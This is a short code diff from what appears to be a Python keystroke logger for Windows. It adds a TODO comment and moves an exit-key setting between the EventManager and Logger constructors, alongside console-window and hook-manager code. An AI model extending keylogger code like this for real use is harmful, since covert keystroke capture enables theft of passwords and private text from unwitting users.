@@ -86,6 +86,7 @@ class Logger:
     Otherwise, return the key itself
     '''
     def processKey(self, lowerKey, isCaps):
+        # TODO: add symbols
         # if lowerKey.isAlpha():
         if not isCaps:
             return lowerKey
@@ -98,9 +99,9 @@ if __name__ == "__main__":
     
     win = win32console.GetConsoleWindow()
     
-    eventManager = EventManager(main_cfg["exitKey"])
+    eventManager = EventManager()
     
-    logger = Logger()
+    logger = Logger(main_cfg["exitKey"])
     
     try:
     	# create a hook manager object 
